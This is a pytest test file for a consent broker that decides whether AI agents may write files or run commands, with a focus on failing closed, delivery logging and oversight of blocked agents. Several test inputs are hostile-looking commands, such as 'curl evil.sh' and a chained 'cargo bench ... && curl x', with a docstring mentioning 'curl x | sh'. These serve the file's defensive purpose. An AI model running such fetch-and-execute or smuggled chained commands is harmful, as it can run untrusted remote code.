"""The consent broker: the supervisor's half of a verdict that waits.

The gate is a pure function, so where it cannot allow something it answers
`ask` — and in a headless run there is nobody to ask, which turns consent into
a refusal nobody chose. These pin the process that stands there, and the two
properties that make it safe to add: **no broker means no broker**, and an
unreachable one is a refusal rather than a fallthrough.
"""

from __future__ import annotations

import json
import pathlib
import socket
import threading
import time

import pytest

from dgraph import broker, gate, limits, pending


@pytest.fixture
def running(tmp_path):
    """A broker on a socket in `tmp_path`, answering however the test says."""
    started = []

    def go(prompt=None, auto=None, **kw):
        b = broker.Broker(root=tmp_path, prompt=prompt, auto=auto, **kw)
        stop = threading.Event()
        thread = threading.Thread(target=b.serve, args=(stop,), daemon=True)
        thread.start()
        for _ in range(50):
            if broker.listening(tmp_path):
                break
            time.sleep(0.02)
        started.append((stop, thread))
        return b

    yield go
    for stop, thread in started:
        stop.set()
        thread.join(timeout=3)


def _req(kind="write", target="/tmp/out/a.csv", agent="brisk-beacon"):
    return broker.request(kind, target, agent, "outside the writable roots")


def _log(root, expect):
    """The log, once `expect` lines are in it.

    Polled rather than read once, and the reason is a property worth stating:
    since `P-F1` the entry is written **after** the answer has been sent, so
    that it can record whether the answer was delivered. A client therefore
    sees its verdict before the line exists, which is the right order — the
    log's job is to say what happened, and delivery is part of that.
    """
    path = pathlib.Path(root) / broker.LOG_NAME
    for _ in range(100):
        raw = path.read_text().strip() if path.exists() else ""
        lines = [json.loads(x) for x in raw.splitlines()] if raw else []
        if len(lines) >= expect:
            return lines
        time.sleep(0.02)
    return lines


# ---- the rungs are read here, not by the gate ----------------------------

def test_the_rungs_default_with_exec_one_stricter():
    assert broker.rung("write", {}) == "scoped"
    assert broker.rung("exec", {}) == "user"


def test_the_rungs_are_read_once_at_construction_not_per_request(monkeypatch):
    """The environment is not policy that may change mid-run. A rung that moved
    between two requests would be a rule nobody declared, and two identical
    requests would be answered differently with nothing in the log to say why."""
    monkeypatch.setenv("DG_CONSENT_WRITE", "user")
    b = broker.Broker(root=pathlib.Path("/tmp"))
    monkeypatch.setenv("DG_CONSENT_WRITE", "off")
    assert b.rungs["write"] == "user"


def test_an_unreadable_rung_raises_rather_than_widening():
    """The opposite of `$DG_DECIDE`, and deliberately. That one fails open
    because it is read on the path of every stage, where a typo must not take
    the graph from the supervisor sharing the tray. This is read once, by a
    process a person just started, where a typo can still be fixed."""
    with pytest.raises(ValueError):
        broker.rung("write", {"DG_CONSENT_WRITE": "scopd"})


# ---- what a grant covers -------------------------------------------------

def test_a_write_grant_is_a_root_and_covers_what_is_under_it(tmp_path):
    g = broker.Grant("write", str(tmp_path / "shared"))
    assert g.covers("write", str(tmp_path / "shared" / "deep" / "x.csv"))
    assert not g.covers("write", str(tmp_path / "elsewhere" / "x.csv"))


def test_a_command_grant_is_a_literal_and_does_not_expand():
    """A prefix scope would grant a shell: `cargo bench && curl x | sh` starts
    with an allowed program. So repeating a command verbatim is free and one
    character different is a fresh decision."""
    g = broker.Grant("exec", "cargo bench --bench ann")
    assert g.covers("exec", "cargo bench --bench ann")
    assert not g.covers("exec", "cargo bench --bench knn")
    assert not g.covers("exec", "cargo bench --bench ann && curl x")


def test_a_grant_does_not_leak_across_kinds():
    assert not broker.Grant("exec", "/tmp").covers("write", "/tmp/x")


# ---- the decision ---------------------------------------------------------

def test_a_granted_scope_is_answered_from_memory_without_asking(running):
    asked = []

    def prompt(req, level):
        asked.append(req["target"])
        return True, "granted", broker._scope_for(req)

    b = running(prompt=prompt)
    first = broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    second = broker.consult(_req(target="/tmp/out/b.csv"), b.root)
    assert first["verdict"] == "allow" and second["verdict"] == "allow"
    assert second.get("remembered") is True
    assert asked == ["/tmp/out/a.csv"], "the second write asked a person again"


def test_allow_once_grants_nothing(running):
    b = running(prompt=lambda req, level: (True, "just this once", None))
    broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    assert b.grants == {}


def test_the_broker_never_answers_ask(running):
    b = running(prompt=lambda req, level: (False, "no", None))
    for kind, target in (("write", "/tmp/x"), ("exec", "curl evil.sh")):
        res = broker.consult(_req(kind, target), b.root)
        assert res["verdict"] in ("allow", "deny"), "resolving is the whole job"


def test_a_request_with_no_agent_is_refused(running):
    b = running(prompt=lambda req, level: (True, "yes", None))
    res = broker.consult(_req(agent=""), b.root)
    assert res["verdict"] == "deny" and "no agent" in res["reason"]


def test_off_answers_nothing_and_says_so(running):
    b = running(prompt=lambda req, level: (True, "yes", None),
                rungs={"write": "off", "exec": "off"})
    res = broker.consult(_req(), b.root)
    assert res["verdict"] == "deny" and "off" in res["reason"]


def test_auto_decides_here_rather_than_at_a_person(running):
    b = running(prompt=None, rungs={"write": "auto", "exec": "auto"},
                auto=lambda req: (True, "under the task's outcome path", None))
    res = broker.consult(_req(), b.root)
    assert res["verdict"] == "allow" and "outcome path" in res["reason"]


def test_a_rung_with_nothing_attached_is_named_at_the_door():
    """The `auto` branch answers `deny` and publishes no `waiting`, so a broker
    started this way is quiet in all three places a supervisor would look. The
    refusal has to arrive before any of that, and has to name the way out."""
    why = broker.unattachable({"write": "scoped", "exec": "auto"}, auto=None)
    assert why and "$DG_CONSENT_EXEC" in why and "scoped" in why
    assert "$DG_CONSENT_WRITE" not in why

    both = broker.unattachable({"write": "auto", "exec": "auto"}, auto=None)
    assert "$DG_CONSENT_WRITE" in both and "$DG_CONSENT_EXEC" in both


def test_the_door_opens_by_itself_once_a_policy_exists():
    """It asks what will actually be attached, not a module global — so writing
    an auto policy is the whole change, with no second place to remember."""
    rungs = {"write": "auto", "exec": "auto"}
    assert broker.unattachable(rungs, auto=lambda req: (True, "", None)) is None
    assert broker.unattachable({"write": "scoped", "exec": "user"}, auto=None) is None


def test_the_broker_will_not_start_on_a_rung_it_cannot_honour(store, monkeypatch):
    """Nothing bound, so the launcher is stopped by a sentence in the terminal
    it is standing in, rather than by agents being denied in another one."""
    from typer.testing import CliRunner
    from dgraph.agent_cli import app
    monkeypatch.setenv("DG_CONSENT_EXEC", "scoped")
    monkeypatch.setenv("COLUMNS", "200")

    res = CliRunner().invoke(app, ["broker", "--exec-rung", "auto"])

    assert res.exit_code == 2
    assert "no auto policy" in res.output and "scoped" in res.output
    assert "listening on" not in res.output
    assert not broker.listening(store)
    assert not (store / broker.SOCKET_NAME).exists()


# ---- the two properties that make this safe to add -----------------------

def test_no_broker_means_no_broker_and_the_gate_answers_as_it_always_did(
        tmp_path, monkeypatch):
    """Not a degraded broker — *no* broker. This is why it ships without a new
    hard dependency, and why it has none of the two-procedures problem that
    made confinement need a declared rung."""
    monkeypatch.setenv("DG_EXEC_ALLOW", "cargo")
    assert not broker.listening(tmp_path)
    with pending.as_owner("brisk-beacon"):
        assert broker.consult(_req(), tmp_path) is None
        v = gate.exec_verdict("curl evil.sh")
    assert v["verdict"] == "ask"


def test_a_listening_broker_that_does_not_answer_is_a_deny(tmp_path):
    """An unreachable decider is not consent. This is the one place in the tool
    that fails closed: everything else guards a rule, and this guards an answer
    nobody gave."""
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(tmp_path / broker.SOCKET_NAME))
    srv.listen(1)
    try:
        res = broker.consult(_req(), tmp_path, timeout=0.5)
        assert res["verdict"] == "deny"
        assert "not consent" in res["reason"]
    finally:
        srv.close()


def test_the_socket_is_not_readable_by_other_users(running):
    """Anyone who can connect can answer as the supervisor, so the socket *is*
    the authority to grant."""
    b = running(prompt=lambda req, level: (True, "yes", None))
    assert (broker.socket_path(b.root).stat().st_mode & 0o077) == 0


def test_the_socket_is_gone_when_the_broker_stops(tmp_path):
    b = broker.Broker(root=tmp_path, prompt=lambda req, level: (True, "y", None))
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    for _ in range(50):
        if broker.listening(tmp_path):
            break
        time.sleep(0.02)
    assert broker.listening(tmp_path)
    stop.set()
    t.join(timeout=3)
    assert not broker.listening(tmp_path)


# ---- the evidence ---------------------------------------------------------

def test_every_answer_is_logged_because_the_grants_are_not_kept(running):
    """The grants die with the broker, so the log is the only record of what a
    run was allowed to do — the shape `net/egress.py` uses for the same reason."""
    b = running(prompt=lambda req, level: (True, "granted", broker._scope_for(req)))
    broker.consult(_req(target="/tmp/out/a.csv"), b.root)
    broker.consult(_req(kind="exec", target="curl x"), b.root)
    lines = _log(b.root, 2)
    assert [x["kind"] for x in lines] == ["write", "exec"]
    assert all(x["agent"] == "brisk-beacon" and x["verdict"] for x in lines)
    assert all(x["delivered"] for x in lines), \
        "both answers reached the gate that asked"


def test_the_request_id_is_stable_so_a_retry_does_not_ask_twice():
    a = broker.request("write", "/tmp/x", "brisk-beacon", "why")
    b = broker.request("write", "/tmp/x", "brisk-beacon", "a different reason")
    c = broker.request("write", "/tmp/y", "brisk-beacon", "why")
    assert a["id"] == b["id"] and a["id"] != c["id"]


def test_the_request_carries_the_gate_s_own_conclusion():
    """The broker decides; it never re-derives policy. `limits` stays the
    single home, which is the adapters-hold-no-policy rule one level up."""
    req = broker.request("write", "/tmp/x", "brisk-beacon", "outside the roots")
    assert req["gate"] == {"verdict": "ask", "reason": "outside the roots"}


def test_the_socket_appears_only_once_it_is_accepting(tmp_path):
    """`bind` creates the file and `listen` starts answering, so binding
    directly at the path opens a window where `listening()` is true and a
    connection is refused — which `consult` correctly reads as an unreachable
    decider and turns into a deny. A spurious refusal at a blocked agent is
    what this seam exists to avoid, so the socket is renamed into place."""
    b = broker.Broker(root=tmp_path, prompt=lambda req, level: (True, "y", None))
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    try:
        for _ in range(400):          # poll hard, to land inside any window
            if broker.listening(tmp_path):
                res = broker.consult(_req(), tmp_path, timeout=2)
                assert res["verdict"] == "allow", res
                return
            time.sleep(0.002)
        pytest.fail("the broker never started listening")
    finally:
        stop.set()
        t.join(timeout=3)


# ---- the deadline: who owns it, and what a give-up means (`P-F1`) ----------
#
# `dg gate` stopped being a pure function. Every bound written around it was
# sized for the function it used to be, and a caller that gives up before its
# callee answers has decided the question — silently, in the direction its
# give-up branch already went, which for `prewrite.py` was to allow the write.

def test_the_caller_names_the_bound_and_the_gate_honours_it(running, tmp_path,
                                                            monkeypatch):
    """The gate answers before its caller can time out, so the caller's
    give-up branch is unreachable rather than load-bearing."""
    from typer.testing import CliRunner
    from dgraph.cli import app

    def slow(req, level):
        time.sleep(30)
        return True, "eventually", None

    running(prompt=slow, rungs={"write": "user", "exec": "user"})
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("DG_AGENT", "brisk-beacon")
    monkeypatch.setenv("DG_WRITE", "launch")
    began = time.monotonic()
    res = CliRunner().invoke(app, ["gate", "--write", "/etc/nowhere",
                                   "--deadline", "2", "--json"])
    took = time.monotonic() - began

    assert took < 10, f"the gate outlasted the deadline it was given ({took:.1f}s)"
    verdict = json.loads(res.stdout)
    assert verdict["verdict"] == "deny", verdict
    assert "2" in verdict["reason"] or "second" in verdict["reason"], verdict


def test_a_deadline_that_passes_is_a_refusal_and_not_a_silence(tmp_path):
    """An undecided request is not consent. `broker.consult` already composes
    this reason for an unreachable decider; a decider who did not answer in
    time is the same event."""
    res = broker.consult({"v": 1, "agent": "a", "kind": "write",
                          "target": "/etc/x"}, tmp_path, timeout=0.1)
    assert res is None, "no socket at all is still *no broker*, not a refusal"


def test_the_log_says_whether_the_answer_was_delivered(tmp_path):
    """`P-F1`'s second half. The consent log recorded a `deny` for a request
    whose caller had already given up and allowed the write, so the one
    artefact a supervisor audits afterwards asserted the opposite of what
    happened."""
    b = broker.Broker(root=tmp_path, prompt=lambda req, lvl: (False, "no", None),
                      rungs={"write": "user", "exec": "user"})
    req = {"v": 1, "id": "x", "agent": "a", "kind": "write", "target": "/etc/x"}
    res = b.decide(req)
    b.record(req, res, delivered=False)
    b.record(req, res, delivered=True)
    lines = [json.loads(l) for l in
             (tmp_path / broker.LOG_NAME).read_text().splitlines()]
    assert lines[0]["delivered"] is False
    assert lines[1]["delivered"] is True


# ---- a path no socket can live at (`P-F9`) --------------------------------

def test_a_project_path_too_long_for_a_socket_says_so(tmp_path, monkeypatch):
    """`AF_UNIX` caps a socket path at 108 bytes and the staging name adds
    `.{pid}` on top. The failure was `OSError: AF_UNIX path too long` raised
    through typer as a traceback, in a checkout depth that is entirely
    ordinary — a nested workspace, a CI working directory."""
    from typer.testing import CliRunner
    from dgraph.agent_cli import app
    deep = tmp_path.joinpath(*["directory-with-a-long-enough-name"] * 4)
    deep.mkdir(parents=True)
    (deep / "decisions.json").write_text("{}", encoding="utf-8")

    why = broker.unbindable(deep)
    assert why and "kernel" in why and str(deep) in why
    assert broker.unbindable(tmp_path) is None

    monkeypatch.chdir(deep)
    res = CliRunner().invoke(app, ["broker"])
    assert res.exit_code == 2
    assert "Traceback" not in res.output and "kernel" in res.output


def test_the_gate_does_not_blame_a_supervisor_for_a_path_limit(tmp_path):
    """The other side of the same wall. A `deny` reading "the broker did not
    answer" names somebody who was never reachable, and tells the agent to
    start a broker that could not run."""
    deep = tmp_path.joinpath(*["directory-with-a-long-enough-name"] * 4)
    deep.mkdir(parents=True)
    (deep / broker.SOCKET_NAME).touch()          # something that looks listening
    out = broker.consult({"v": 1, "agent": "a", "kind": "write",
                          "target": "/etc/x"}, deep)
    assert out is None or "dg-agent broker" not in out["reason"]


# ---- a scope is shown before it is granted (`P-F11`) ----------------------

def test_the_person_is_told_which_root_they_are_granting(monkeypatch, capsys):
    """`[s]cope` grants the target's whole directory — `D07`, a root rather
    than a glob — and the prompt showed only the file. A person consenting to
    one path was granting every sibling of it, unasked."""
    monkeypatch.setattr("builtins.input", lambda prompt="": (
        print(prompt), "s")[1])
    req = _req(target="/tmp/shared-bench/out.csv")
    ok, why, grant = broker.terminal_prompt(req, "scoped")
    shown = capsys.readouterr().out
    assert ok and grant is not None
    assert "/tmp/shared-bench" in shown, \
        "the root being granted was never named to the person granting it"
    assert grant.value in why


def test_a_grant_the_floor_could_not_honour_is_never_offered(tmp_path,
                                                             monkeypatch):
    """Consenting to a path outside the mounts hands out a permission the
    kernel refuses seconds later. The mounts are fixed at spawn and no broker
    can widen them, so there is no rung on which the answer could be yes."""
    monkeypatch.setenv("DG_CONFINE", "require")
    asked = []
    b = broker.Broker(root=tmp_path, rungs={"write": "scoped", "exec": "user"},
                      prompt=lambda req, lvl: (asked.append(req), (True, "y", None))[1])
    res = b.decide(broker.request("write", "/etc/hosts", "brisk-beacon", "why",
                                  roots=["/tmp", "/home/x/proj"]))
    assert res["verdict"] == "deny" and "outside" in res["reason"]
    assert not asked, "the ladder offered a grant it could not implement"

    # …and a path the floor *does* cover still reaches the person.
    b.decide(broker.request("write", "/tmp/elsewhere/x", "brisk-beacon", "why",
                            roots=["/tmp", "/home/x/proj"]))
    assert asked


def test_the_gate_tells_the_broker_what_it_judged_against(tmp_path, monkeypatch):
    """The input that check needs. `roots` was in the request's shape from the
    first commit and filled by nobody."""
    from dgraph import limits
    seen = {}
    b = broker.Broker(root=tmp_path, rungs={"write": "user", "exec": "user"},
                      prompt=lambda req, lvl: (seen.update(req), (False, "n", None))[1])
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    for _ in range(50):
        if broker.listening(tmp_path):
            break
        time.sleep(0.02)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("DG_AGENT", "brisk-beacon")
    monkeypatch.setenv("DG_WRITE", "launch")
    try:
        gate.write_verdict("/etc/nowhere")
    finally:
        stop.set()
        t.join(timeout=3)
    assert seen.get("roots") == limits.writable_roots(tmp_path)


# ---- a blocked agent is not a stalled one (`P-F7`) ------------------------

def test_the_broker_publishes_who_is_blocked_and_on_what(running, tmp_path):
    """`D24` gave a blocked agent a heartbeat so `expire` would stop parking
    work that was only waiting on a person — and that cost the other half of
    `Seen`: a blocked agent now stamps its lease exactly as a working one does.
    The column is what tells them apart, and the broker is the only party that
    can fill it: the lease file has to stay writable by the agent, so a waiting
    state kept there is one the agent could clear."""
    seen = threading.Event()
    held = threading.Event()

    def wait_there(req, level):
        seen.set()
        held.wait(timeout=5)
        return False, "no", None

    b = running(prompt=wait_there, rungs={"write": "user", "exec": "user"})
    asker = threading.Thread(
        target=lambda: broker.consult(_req(target="/etc/x"), tmp_path),
        daemon=True)
    asker.start()
    assert seen.wait(timeout=5)
    for _ in range(100):
        now = broker.waiting(tmp_path)
        if now:
            break
        time.sleep(0.02)

    assert now.get("brisk-beacon"), "nothing said the agent was blocked"
    assert now["brisk-beacon"]["kind"] == "write"
    assert now["brisk-beacon"]["target"] == "/etc/x"

    held.set()
    asker.join(timeout=5)
    for _ in range(100):
        if not broker.waiting(tmp_path):
            break
        time.sleep(0.02)
    assert broker.waiting(tmp_path) == {}, "the wait outlived the answer"


def test_no_broker_and_nobody_waiting_are_the_same_reading(tmp_path):
    """Three states a reader must not tell apart, because only one of them is
    about an agent: no broker, no waiter, and an unreadable file."""
    assert broker.waiting(tmp_path) == {}
    (tmp_path / broker.WAITING_NAME).write_text("not json", encoding="utf-8")
    assert broker.waiting(tmp_path) == {}


def test_the_column_appears_only_where_a_broker_could_have_filled_it(tmp_path,
                                                                     monkeypatch):
    """An always-blank column reads as "nobody is waiting" rather than "nothing
    could tell you", which is the distinction this whole finding is about."""
    from typer.testing import CliRunner
    from dgraph import agents
    from dgraph.agent_cli import app
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("COLUMNS", "200")
    agents.claim(budget=None)

    assert "Waiting" not in CliRunner().invoke(app, ["list"]).output

    b = broker.Broker(root=tmp_path, prompt=lambda r, l: (False, "", None))
    stop = threading.Event()
    t = threading.Thread(target=b.serve, args=(stop,), daemon=True)
    t.start()
    try:
        for _ in range(50):
            if broker.listening(tmp_path):
                break
            time.sleep(0.02)
        assert "Waiting" in CliRunner().invoke(app, ["list"]).output
    finally:
        stop.set()
        t.join(timeout=3)
